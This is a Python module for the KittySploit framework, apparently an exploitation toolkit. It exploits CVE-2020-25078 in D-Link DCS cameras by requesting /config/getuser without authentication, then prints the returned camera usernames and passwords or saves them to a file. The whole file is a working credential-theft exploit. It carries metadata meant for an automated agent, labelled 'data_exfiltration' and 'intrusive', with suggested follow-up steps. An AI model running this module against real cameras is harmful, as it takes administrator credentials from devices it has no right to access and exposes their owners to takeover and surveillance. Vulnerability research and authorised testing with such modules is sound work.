#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DCS unauthenticated credential dump via /config/getuser (CVE-2020-25078)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DCS - Unauth Credential Dump (CVE-2020-25078)',
        'description': (
            'Dumps camera credentials from /config/getuser?index=0 (CVE-2020-25078).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2020-25078'],
        'platform': Platform.LINUX,
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10180',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25078',
        ],
        'tags': ['dlink', 'camera', 'credentials', 'unauth', 'cve-2020-25078'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2020_25078_detect'],
            },
        },
    }

    index = OptInteger(0, 'getuser index', required=False)
    output_file = OptString('', 'Local file to write retrieved content', required=False)

    def run(self):
        idx = int(self.index or 0)
        path = f'/config/getuser?index={idx}'
        print_status(f'Fetching {path} ...')
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            print_error('Empty / non-200 response')
            return False
        body = r.text or ''
        if 'name=' not in body or 'pass=' not in body:
            print_error('No credential lines found')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote credentials to {out}')
        else:
            print_info(body)
        return True
